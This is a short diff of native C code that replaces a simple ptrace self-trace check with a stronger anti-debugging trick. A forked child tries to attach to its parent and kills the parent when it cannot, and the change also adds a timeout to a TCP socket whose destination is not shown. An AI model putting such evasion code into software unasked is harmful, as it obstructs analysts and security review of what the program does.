@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <sys/ptrace.h>
 #include <sys/socket.h>
+#include <sys/wait.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <stdlib.h>
@@ -34,12 +35,27 @@ extern "C" {
             close(fd);
         }
 
-        if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
-            exit(0);
+        pid_t child = fork();
+        if (child == 0) {
+            pid_t parent = getppid();
+            if (ptrace(PTRACE_ATTACH, parent, NULL, NULL) == 0) {
+                ptrace(PTRACE_DETACH, parent, NULL, NULL);
+                _exit(0);
+            } else {
+                kill(parent, SIGKILL);
+                _exit(1);
+            }
+        } else if (child > 0) {
+            waitpid(child, NULL, 0);
         }
 
         int s = socket(AF_INET, SOCK_STREAM, 0);
         if (s != -1) {
+            struct timeval tv;
+            tv.tv_sec = 0;
+            tv.tv_usec = 500000;
+            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
+
             struct sockaddr_in a;
             memset(&a, 0, sizeof(a));
             a.sin_family = AF_INET;
